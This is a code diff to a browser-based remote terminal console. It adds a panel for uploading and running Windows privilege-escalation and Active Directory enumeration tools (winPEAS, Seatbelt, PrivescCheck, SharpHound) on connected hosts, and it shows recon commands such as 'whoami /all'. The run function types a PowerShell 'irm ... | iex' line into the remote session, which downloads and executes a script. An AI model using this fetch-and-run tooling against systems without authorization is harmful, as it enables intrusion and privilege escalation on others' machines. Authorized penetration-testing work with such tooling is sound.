@@ -1,7 +1,13 @@
 /* Browser terminal control with single-use connector enrollment. */
 (function(){
   let enabled=false,ticket='',expires=0,platform='win',selected='',terminal=null,fit=null,cursor=0,generation=0,polling=false;
-  let inputQueue=Promise.resolve(),sessions=[],available=[],proxy=null,callbacks=[];
+  let inputQueue=Promise.resolve(),sessions=[],available=[],proxy=null,callbacks=[],tools=[];
+  const windowsTools=[
+    {id:'winpeas',name:'winPEAS',file:/^winpeas.*\.(exe|bat)$/i,kind:'winpeas',expected:'winPEAS*.exe/.bat',desc:'Broad local enumeration. Very noisy and frequently flagged by Defender/EDR.'},
+    {id:'seatbelt',name:'Seatbelt',file:/^seatbelt\.exe$/i,kind:'seatbelt',expected:'Seatbelt.exe',desc:'Host, user, and security posture checks. .NET; generally quieter than winPEAS.'},
+    {id:'privesccheck',name:'PrivescCheck',file:/^privesccheck\.ps1$/i,kind:'privesccheck',expected:'PrivescCheck.ps1',desc:'Detailed low-privilege privilege-escalation checks. Best local signal of the four.'},
+    {id:'sharphound',name:'SharpHound',file:/^sharphound\.exe$/i,kind:'sharphound',expected:'SharpHound.exe',desc:'AD collection for BloodHound. Domain user; produces a ZIP for import.'}
+  ];
   const reconCommands=[
     ['Identity','Whoami full',String.raw`whoami /all`],
     ['Identity','Token privileges',String.raw`whoami /priv`],
@@ -138,6 +144,49 @@
       actions.append(run,copy);row.append(label,code,actions);list.appendChild(row);
     });
   }
+  function stagedTool(def){return tools.find(tool=>def.file.test(tool.name))}
+  function renderTools(){
+    const list=q('windows-tool-list');if(!list)return;
+    list.replaceChildren();
+    windowsTools.forEach(def=>{
+      const staged=stagedTool(def);
+      const card=document.createElement('div');card.className='tool-card';
+      const head=document.createElement('div');head.className='tool-head';
+      const title=document.createElement('strong');title.textContent=def.name;
+      const status=document.createElement('span');status.className='meta';status.textContent=staged?staged.name+' · '+fmt(staged.size):'not staged · '+def.expected;
+      head.append(title,status);
+      const desc=document.createElement('p');desc.className='hint';desc.textContent=def.desc;
+      const actions=document.createElement('div');actions.className='tool-actions';
+      const input=document.createElement('input');input.type='file';input.accept=def.id==='privesccheck'?'.ps1':'.exe,.bat,.cmd';
+      const upload=document.createElement('button');upload.className='btn ghost sm';upload.textContent='Upload';
+      upload.addEventListener('click',async()=>{
+        if(!input.files.length){notice('Choose a file first');return}
+        try{await uploadTool(input.files[0]);notice('Uploaded '+input.files[0].name)}
+        catch(e){notice(e.message)}
+      });
+      const run=document.createElement('button');run.className='btn ghost sm';run.textContent='Run';run.disabled=!staged;
+      run.addEventListener('click',()=>runTool(def,staged).catch(e=>notice(e.message)));
+      actions.append(input,upload,run);card.append(head,desc,actions);list.appendChild(card);
+    });
+  }
+  async function refreshTools(){tools=(await api('tools')).tools||[];renderTools()}
+  async function uploadTool(file){
+    const response=await fetch('/console/tools/'+encodeURIComponent(file.name),{method:'POST',body:file,headers:{'Content-Type':'application/octet-stream'}});
+    const value=await response.json().catch(()=>({error:'Upload failed'}));
+    if(!response.ok)throw Error(value.error||'Upload failed');
+    await refreshTools();
+  }
+  async function runTool(def,staged){
+    if(!selected){notice('Select a console first');return}
+    const session=sessions.find(s=>s.id===selected);
+    if(!session||session.os!=='windows'){notice('Select a Windows console first');return}
+    if(!staged){notice('Upload '+def.name+' first');return}
+    const info=await api('winenum/ticket','POST',{});
+    const origin=location.origin;
+    const command=`$ExposeTicket='${info.ticket}'; $ExposeOrigin='${origin}'; $ExposeTool='${staged.name}'; $ExposeKind='${def.kind}'; irm "$ExposeOrigin/console/toolrunner.ps1?ticket=$ExposeTicket" | iex`;
+    await api('sessions/'+selected+'/input','POST',{data:command+'\r'});
+    notice(def.name+' started; report will appear in Received files');
+  }
   async function refresh(){
     if(!enabled||polling)return;polling=true;
     try{
@@ -210,6 +259,7 @@
     q('console-controls').hidden=!enabled;
     if(!enabled){q('console-help').textContent='Start expose-online to use browser terminals.';return}
     await refresh();
+    await refreshTools();
     if(terminalSession)return;
     if(available.length)await invite();
     else notice('Build connectors on the host with: make -C expose install-console-clients');
